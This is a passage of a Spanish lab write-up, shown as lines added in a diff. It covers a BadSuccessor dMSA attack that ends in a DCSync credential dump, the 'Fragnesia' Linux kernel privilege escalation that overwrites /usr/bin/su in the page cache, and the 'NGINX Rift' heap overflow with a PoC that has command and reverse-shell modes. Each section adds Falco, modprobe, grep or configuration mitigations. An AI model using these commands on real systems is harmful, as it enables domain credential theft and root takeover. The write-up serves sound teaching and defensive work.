+bloodyAD -d tryhackme.local -u 'tbyte' -p 'P@SSw0rd345' --host DC-LAB2025-01.tryhackme.local add badSuccessor pentest2_dmsa
+```
+Este comando genera automáticamente un archivo de credenciales de Kerberos en formato `.ccache` (por ejemplo, `pentest2_dmsa_ts.ccache`).
+
+En cuarto lugar, se exporta la ruta del archivo `.ccache` a la variable de entorno del sistema:
+```bash
+export KRB5CCNAME=pentest2_dmsa_ts.ccache
+```
+
+En quinto lugar, se solicita el ticket de servicio TGS utilizando la herramienta `getST.py` de Impacket:
+```bash
+python3 /opt/impacket/examples/getST.py -dc-ip 10.211.101.10 -spn 'cifs/DC-LAB2025-01.tryhackme.local' 'tryhackme.local/pentest2_dmsa$' -k -no-pass
+```
+
+En sexto lugar, se exporta el nuevo archivo `.ccache` generado por `getST.py`:
+```bash
+export KRB5CCNAME=pentest_dmsa$.ccache
+```
+
+Finalmente, se ejecuta un ataque de DCSync mediante `secretsdump.py` para extraer la totalidad de las credenciales y hashes NTLM de todos los usuarios de Active Directory:
+```bash
+python3 /opt/impacket/examples/secretsdump.py -k -no-pass 'pentest2_dmsa$'@DC-LAB2025-01.tryhackme.local
+```
+
+---
+
+## 7. CVE-2026-46300: Fragnesia
+
+### 7.1. Introducción y la Clase de Escritura en Caché de Página
+Fragnesia (catalogada como CVE-2026-46300 con una puntuación CVSS v3.1 de 7,8) es una vulnerabilidad crítica de escalada de privilegios locales (LPE) en el núcleo Linux. Fue descubierta por William Bowling (de la firma Zellic) utilizando la herramienta de auditoría automatizada basada en IA llamada V12.
+
+Esta vulnerabilidad pertenece a la clase de fallos de corrupción de la caché de página (*page cache write*), una categoría de explotación que incluye antecedentes célebres como Copy Fail y Dirty Frag. Lo que distingue a Fragnesia es que fue introducida directamente por uno de los parches destinados a solucionar la vulnerabilidad previa Dirty Frag.
+
+### 7.2. La Invariante Rota: SKBFL_SHARED_FRAG y skb_try_coalesce()
+Un búfer de socket (`struct sk_buff` o `skb`) en el núcleo Linux administra una matriz de fragmentos que representan páginas de memoria. La mayoría de los fragmentos pertenecen a búferes privados de la pila de red, pero cuando un proceso utiliza la llamada del sistema `splice()` para enviar datos de un archivo a un socket sin copiar bytes, el núcleo adjunta directamente referencias a las páginas de la caché de página del archivo en el `skb`.
+
+Para evitar que las funciones de red modifiquen páginas de la caché de página que son compartidas en todo el sistema, el núcleo marca esos fragmentos con el indicador `SKBFL_SHARED_FRAG`. Esta bandera es una invariante que indica a las funciones posteriores: "esta memoria es externa; si necesitas modificarla, realiza primero una copia privada mediante `skb_cow_data()`".
+
+El error raíz se introdujo en el año 2013 en la función `skb_try_coalesce()`, la cual se encarga de fusionar dos paquetes `skb` continuos para optimizar la memoria. Al transferir fragmentos entre búferes, `skb_try_coalesce()` omitía la propagación de la bandera `SKBFL_SHARED_FRAG`. Los fragmentos fusionados quedaban respaldados por páginas de la caché de página global pero con la bandera despojada, aparentando ser búferes privados ordinarios.
+
+El fallo permaneció latente durante trece años porque ninguna función de la pila de red tomaba decisiones destructivas basándose en la presencia de esa bandera en paquetes fusionados.
+
+### 7.3. La Ruta de Recepción XFRM ESP-in-TCP
+ESP-in-TCP (RFC 8229) es un mecanismo del núcleo que encapsula paquetes IPsec ESP sobre conexiones TCP para atravesar cortafuegos. Al activar esta opción en un socket TCP, el núcleo procesa las cargas útiles entrantes mediante la función `esp_input()`.
+
+`esp_input()` realiza el descifrado criptográfico AEAD (AES-GCM) directamente sobre el búfer del paquete entrante para optimizar el rendimiento. El parche aplicado para solucionar la vulnerabilidad Dirty Frag (`f4c50a4034e6`) añadió una verificación en `esp_input()` que consulta `skb_has_shared_frag()`. Si la bandera está presente, la función realiza una copia privada; si la bandera no está presente, descifra los datos *in-situ* sobre el búfer existente.
+
+Al procesar paquetes que pasaron por `skb_try_coalesce()`, la bandera `SKBFL_SHARED_FRAG` ya no está presente. Como consecuencia, `esp_input()` ejecuta el descifrado criptográfico *in-situ* escribiendo los datos directamente sobre las páginas de la caché de página global compartida.
+
+### 7.4. Primitiva de Escritura de 1 Byte y Corrupción de /usr/bin/su
+El descifrado AES-128-GCM ejecutado sobre el búfer despojado de la bandera permite modificar bytes en la caché de página. Al manipular los 32 bits inferiores del Vector de Inicialización (IV) de 8 bytes en la asociación de seguridad de IPsec, cada ejecución del exploit escribe exactamente 1 byte controlado en un desplazamiento elegido dentro de la caché de página.
+
+El exploit precalcula una tabla de búsqueda de 256 entradas que mapea cada valor de byte deseado con el IV que lo genera. La prueba de concepto sobrescribe los primeros 192 bytes de la copia en memoria del ejecutable `usr/bin/su` con un código de shell (*stub ELF*) de 176 bytes que invoca las llamadas `setgid(0)`, `setuid(0)` y `execve("/bin/sh")`.
+
+Dado que `usr/bin/su` ya es un binario ELF, 16 bytes de su cabecera coinciden con el stub, por lo que el exploit ejecuta únicamente 176 escrituras individuales de 1 byte, completando la corrupción en pocos milisegundos. El archivo físico `usr/bin/su` almacenado en el disco duro jamás se modifica; su hash en disco permanece limpio y las herramientas de integridad como AIDE reportan el archivo como intacto.
+
+### 7.5. Explotación Práctica de Dos Etapas en el Laboratorio
+La explotación de Fragnesia se ejecuta en un flujo de dos etapas bien definidas.
+
+En la primera etapa, se inicia sesión como el usuario no privilegiado `karen` (contraseña `fragnesia2026`). Se compila el exploit ubicado en `/home/karen/fragnesia/fragnesia.c` mediante el comando `gcc -w fragnesia.c -o fragnesia`. Al ejecutar `./fragnesia`, la prueba de concepto utiliza la llamada `unshare(CLONE_NEWUSER | CLONE_NEWNET)` para crear un espacio de nombres de usuario aislado donde la cuenta obtiene privilegios `CAP_NET_ADMIN` locales. A continuación, utiliza `splice()` para vincular la copia de `/usr/bin/su` con el socket TCP y desencadena las escrituras de 1 byte. Al finalizar, la PoC ejecuta `execve("/usr/bin/su")` dentro del espacio de nombres; en la pantalla aparece un shell con el indicador `#` y `whoami` devuelve `root`. Sin embargo, esta es una raíz de espacio de nombres (*namespace-root*) que no puede leer archivos protegidos del host (como `/root/flag.txt`) porque el UID real en la máquina raíz sigue siendo 1001.
+
+En la segunda etapa, se sale del shell del espacio de nombres escribiendo `exit`, volviendo a la terminal normal del usuario `karen` fuera del espacio de nombres. La caché de página del núcleo es global y el binario `/usr/bin/su` continúa dañado en la memoria RAM del host. Al ejecutar simplemente `/usr/bin/su` desde la terminal normal de `karen`, el núcleo del sistema operativo lee el ejecutable dañado desde la caché de página, reconoce el bit `setuid` del archivo en disco, establece el UID efectivo en 0 real del host y ejecuta el stub del atacante. El stub llama a `setuid(0)` y genera un shell interactivo. Al ejecutar `whoami` se confirma acceso como `root` real del host y se puede leer la bandera con `cat /root/flag.txt`.
+
+Para limpiar la memoria del laboratorio tras la prueba, se ejecuta el comando `echo 3 > /proc/sys/vm/drop_caches` como `root`, obligando al núcleo a desalojar las páginas modificadas de la RAM y recargar la copia limpia del disco.
+
+### 7.6. Detección, Reglas Auditd/Falco y Mitigación con Modprobe
+El intento de explotación genera un patrón de llamadas al sistema inusual que permite su detección en tiempo real.
+
+Las llamadas clave a monitorear incluyen `unshare(CLONE_NEWUSER)`, la creación de sockets criptográficos `socket(AF_ALG)`, el empalme de un binario setuid mediante `splice()` y, especialmente, la activación del protocolo ESP en TCP mediante `setsockopt(SOL_TCP, TCP_ULP, "espintcp")`. La combinación de `splice()` sobre un archivo setuid seguido de `setsockopt` con `espintcp` constituye una señal inequívoca de ataque.
+
+La regla de detección para el motor Falco identifica la activación maliciosa de `espintcp`:
+```yaml
+- rule: Explotación de Fragnesia (CVE-2026-46300)
+  desc: Detecta la activación del protocolo espintcp ULP tras el empalme de un ejecutable setuid en un socket TCP.
+  condition: >
+    evt.type = setsockopt and
+    evt.dir = > and
+    fd.type = tcp and
+    evt.arg.optname = "TCP_ULP" and
+    evt.arg.val = "espintcp" and
+    not proc.name in (strongswan, charon)
+  output: Intento de explotación de Fragnesia detectado (usuario=%user.name proceso=%proc.name cmdline=%proc.cmdline)
+  priority: CRITICAL
+```
+
+La mitigación inmediata para sistemas que no han podido aplicar el parche oficial del núcleo (`f84eca581739`) consiste en deshabilitar los módulos vulnerables del núcleo creando el archivo `/etc/modprobe.d/fragnesia-block.conf`:
+```text
+blacklist esp4
+blacklist esp6
+blacklist rxrpc
+```
+Tras guardar el archivo, se ejecutan los comandos `rmmod esp4 esp6 rxrpc 2>/dev/null` y `echo 3 > /proc/sys/vm/drop_caches`. Al bloquear la carga de los módulos IPsec ESP, cualquier intento de ejecutar el exploit fallará al invocar el `setsockopt` con `espintcp`.
+
+---
+
+## 8. CVE-2026-42945: Nginx Rift
+
+### 8.1. Introducción y la Falla en ngx_http_rewrite_module
+NGINX Rift (catalogada como CVE-2026-42945 con una puntuación CVSS v4.0 de 9,2 crítica) es una vulnerabilidad de desbordamiento de búfer de montón (*heap buffer overflow*) presente en el módulo `ngx_http_rewrite_module` de NGINX.
+
+El fallo permite a un atacante remoto no autenticado denegar el servicio bloqueando los procesos de trabajo (*workers*) de NGINX o, en condiciones de memoria adecuadas, lograr la ejecución remota de código (RCE) con los privilegios del proceso web. La vulnerabilidad estuvo presente en la base de código desde el año 2008 hasta su divulgación en mayo de 2026.
+
+Afecta a NGINX Open Source (versiones 0.6.27 a 1.30.0), NGINX Plus (R32 a R36) y productos derivados como NGINX Ingress Controller.
+
+### 8.2. Las Directivas Rewrite y Set y el Motor de Scripts de Dos Pasadas
+La vulnerabilidad se desencadena en configuraciones de NGINX que combinan la directiva `rewrite` utilizando capturas no nombradas de expresiones regulares (como `$1` o `$2`), una cadena de reemplazo que contiene un signo de interrogación (`?`), y una directiva posterior de asignación `set` o un bloque `if` dentro del mismo alcance.
+
+NGINX procesa estas directivas compilándolas en código de bytes que es ejecutado por un motor de scripts interno en un proceso de dos pasadas. La Primera Pasada (*Length Pass*) calcula la longitud total de la cadena de salida para asignar exactamente la memoria necesaria en el grupo de memoria por solicitud (`ngx_pool_t`). La Segunda Pasada (*Copy Pass*) escribe los datos reales dentro del búfer asignado.
+
+El error de causa raíz reside en la gestión del indicador interno `is_args`. Cuando la cadena de reemplazo en la directiva `rewrite` contiene un signo de interrogación, el motor establece el indicador `is_args = 1` en el motor principal para señalar que los caracteres siguientes forman parte de los argumentos URL. Cuando se ejecuta la directiva `set` posterior, la Primera Pasada ejecuta el cálculo de longitud contra un submotor limpio donde `is_args = 0`, contando los caracteres capturados como bytes normales en texto plano (1 byte por carácter). Sin embargo, la Segunda Pasada se ejecuta en el motor principal donde `is_args` permanece en 1. Al detectar `is_args = 1`, la función de copia invoca `ngx_escape_uri`, convirtiendo caracteres como el signo más (`+`) en su forma codificada por porcentaje (`%2B`), la cual ocupa 3 bytes.
+
+Si la subcadena capturada por el cliente contiene $N$ signos más, la Primera Pasada reserva un búfer de $N$ bytes, pero la Segunda Pasada escribe $N + 2N$ bytes (es decir, $3N$ bytes). La diferencia de $2N$ bytes se escribe más allá de los límites del búfer asignado, produciendo un desbordamiento de montón determinista en la memoria del proceso de NGINX.
+
+### 8.3. Del Desbordamiento de Montón a la Ejecución de Código (Cross-Request Feng Shui)
+Para convertir el desbordamiento de montón en ejecución remota de código, el atacante sobrescribe las estructuras de gestión de memoria de NGINX.
+
+NGINX administra la memoria de cada solicitud mediante la estructura `ngx_pool_t`. Cada grupo de memoria contiene una lista vinculada de funciones de limpieza (`ngx_pool_cleanup_t`) que se invocan cuando el grupo se destruye. Cada entrada de limpieza incluye un puntero a una función de manejo (*handler*) y un puntero a los datos de argumento (*data*).
+
+El ataque utiliza la técnica de Feng Shui de Montón entre Solicitudes (*Cross-Request Heap Feng Shui*). En primer lugar, se abre una conexión HTTP inicial enviando encabezados incompletos para forzar a NGINX a asignar un grupo de memoria sin finalizar la solicitud. En segundo lugar, se abre una segunda conexión HTTP paralela para que el asignador de memoria coloque el grupo de la segunda solicitud inmediatamente contiguo al primero en el montón. En tercer lugar, se completan los encabezados de la primera conexión enviando una URL con más de 2.000 signos más en el parámetro capturado, activando la directiva `rewrite` y desbordando el grupo de memoria adyacente. En cuarto lugar, el desbordamiento sobrescribe el puntero del manejador de limpieza objetivo. Finalmente, se cierra la segunda conexión, obligando a NGINX a ejecutar `ngx_destroy_pool()`, la cual recorre la lista corrompida e invoca la función seleccionada por el atacante (como `system()`) pasando los comandos inyectados como argumento.
+
+Debido a que NGINX utiliza un proceso maestro que reaparece inmediatamente un nuevo proceso de trabajo cuando un trabajador se bloquea manteniendo el mismo mapa de memoria, el atacante puede iterar el exploit de forma automatizada hasta que la fuerza bruta de punteros tenga éxito.
+
+### 8.4. Explotación Práctica del Contenedor Docker
+La explotación práctica se realiza contra el entorno de laboratorio desplegado en el contenedor Docker local (`nginx-rift-nginx-1` en el puerto `19321`).
+
+Para ejecutar un comando individual en el servidor objetivo, se utiliza el script de explotación `poc.py` en modo comando:
+```bash
+python3 poc.py --target http://127.0.0.1:19321 --cmd "id > /tmp/pwned"
+```
+El script envía ráfagas de solicitudes con cadenas de signos más y combinaciones de punteros hasta lograr la ejecución. Tras completar el ataque, se verifica la ejecución del comando dentro del contenedor mediante `docker exec nginx-rift-nginx-1 cat /tmp/pwned`, confirmando que el archivo marcador ha sido creado con privilegios de `root`.
+
+Para obtener un shell inverso interactivo dentro del contenedor, se ejecuta el script en modo shell:
+```bash
+python3 poc.py --target http://127.0.0.1:19321 --shell
+```
+El script inicia un oyente local en el puerto TCP 1337, ejecuta la fuerza bruta de desbordamiento y captura la conexión entrante de la shell de `/bin/sh`. Desde el shell interactivo obtenido, se puede consultar la bandera del laboratorio ejecutando `cat /flag.txt`.
+
+### 8.5. Detección, Parcheo y Solución Temporal por Configuración
+La vulnerabilidad ha sido corregida formalmente en las versiones oficiales de NGINX Open Source 1.30.1 y 1.31.0, así como en NGINX Plus R32 P6 y R36 P4.
+
+La detección en registros web se realiza analizando los archivos `access.log` de NGINX en busca de peticiones HTTP con cadenas inusualmente largas de signos más consecutivos:
+```bash
+grep -E '\+{30,}' /var/log/nginx/access.log
+```
+Asimismo, los archivos `error.log` registrarán reinicios repetidos de los procesos de trabajo (*worker process exited on signal 11*) en ventanas de tiempo muy reducidas.
+
+En entornos donde no sea posible actualizar inmediatamente el binario de NGINX, la vulnerabilidad se neutraliza sustituyendo todas las capturas no nombradas de expresiones regulares por capturas nombradas en la configuración. Modificar la directiva de `rewrite ^/api/(.*)$ /internal?$1;` a una captura nombrada con la sintaxis `rewrite ^/api/(?<path>.*)$ /internal?$path;` fuerza a NGINX a utilizar una ruta de evaluación de código diferente que no está afectada por el fallo del indicador `is_args`, eliminando por completo el vector de desbordamiento.
